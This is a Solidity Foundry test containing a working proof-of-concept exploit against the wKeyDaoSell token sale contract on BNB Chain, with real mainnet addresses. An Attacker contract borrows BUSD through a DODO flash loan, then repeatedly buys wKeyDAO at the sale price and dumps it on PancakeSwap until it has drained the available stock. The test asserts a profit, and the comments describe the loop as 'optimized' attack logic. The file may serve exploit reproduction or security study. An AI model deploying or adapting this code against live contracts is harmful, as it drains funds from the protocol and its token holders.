// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

// Addresses
address constant wKeyDaoSell = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant wKeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant DODO_POOL = 0x107F3Be24e3761A91322AA4f5F54D9f18981530C;

contract wKeyDao_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Connect to the local anvil fork provided by the simulator
        vm.createSelectFork("http://127.0.0.1:8545");
    }

    function testPoC() public {
        vm.startPrank(attacker);
        Attacker attc = new Attacker();

        uint balanceBefore = IERC20(BUSD).balanceOf(address(attc));
        console2.log("Attacker BUSD Balance Before:", balanceBefore / 1e18);

        attc.fire();

        uint balanceAfter = IERC20(BUSD).balanceOf(address(attc));
        console2.log("Attacker BUSD Balance After: ", balanceAfter / 1e18);
        console2.log("Total Profit: ", (balanceAfter - balanceBefore) / 1e18);
        
        // Assert positive profit
        require(balanceAfter > balanceBefore, "No profit made!");
    }
}

contract Attacker {

    function fire() external {   
        // Flashloan amount from original PoC
        __dodoFlashLoan(DODO_POOL, 1_200e18, BUSD);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function __dodoFlashLoan(
        address flashLoanPool, 
        uint256 loanAmount, 
        address loanToken
    ) internal   {
        bytes memory data = abi.encode(flashLoanPool, loanToken, loanAmount);
        address flashLoanBase = IDODO(flashLoanPool)._BASE_TOKEN_();
        
        if(flashLoanBase == loanToken) {
            IDODO(flashLoanPool).flashLoan(loanAmount, 0, address(this), data);
        } else {
            IDODO(flashLoanPool).flashLoan(0, loanAmount, address(this), data);
        }
    }

    //Note: CallBack function executed by DODOV2(DVM) flashLoan pool
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.decode(data, (address, address, uint256));
        
        require(sender == address(this) && msg.sender == flashLoanPool, "HANDLE_FLASH_NENIED");

        __realAttack();

        //Return funds
        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
    }

    function __realAttack() internal {

        //approve BUSD to wKeyDaoSell
        IERC20(BUSD).approve(wKeyDaoSell, type(uint256).max);

        //approve wKeyDAO to pancakeSwapRouterV2
        IERC20(wKeyDAO).approve(pancakeSwapRouterV2, type(uint256).max);

        // --- INTELLIGENT ATTACK LOGIC ---
        
        // 1. Get current sale info to find availability
        (
            uint256 price,
            , // totalTokens
            uint256 immediateReleaseTokens,
            uint256 available,
            , // initialAvailable
            , // timestamp
              // operator
        ) = IwKeyDaoSell(wKeyDaoSell).currentSaleInfo();

        console2.log("--- Target Status ---");
        console2.log("Cost per Buy:", price);
        console2.log("wKey Received:", immediateReleaseTokens);
        console2.log("Stock Available:", available);
        
        // 2. Maximize the loop
        // Ensure we don't try to buy more than we have BUSD for (though flashloan covers it usually)
        // BUSD balance is 1200e18. If price is high, we might be limited by BUSD.
        // Price in original PoC was small enough.
        
        uint256 loopCount = available;
        
        console2.log("Executing Optimized Loop:", loopCount, "times");

        for (uint256 i = 0; i < loopCount; i ++) {
            //buy
            IwKeyDaoSell(wKeyDaoSell).buy();

            //sell wKeyDAO immediately to realize profit and recycle BUSD if needed
            // The original PoC swaps every time.
            address[] memory path = new address[](2);
            path[0] = address(wKeyDAO);
            path[1] = address(BUSD);
            
            uint256 wKeyBalance = IERC20(wKeyDAO).balanceOf(address(this));
            
            IPancakeRouter02(pancakeSwapRouterV2).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                wKeyBalance,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        
    }
}

interface IwKeyDaoSell {
    function buy() external;
    // Struct unpacking for currentSaleInfo
    function currentSaleInfo() external view returns (
        uint256 price, 
        uint256 totalTokens, 
        uint256 immediateReleaseTokens, 
        uint256 available, 
        uint256 initialAvailable, 
        uint256 timestamp, 
        address operator
    );
}

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function _BASE_TOKEN_() external view returns (address);
    function _BASE_RESERVE_() external view returns (uint112);
    function _QUOTE_TOKEN_() external view returns (address);
    function _QUOTE_RESERVE_() external view returns (uint112);
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IPancakeRouter02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}
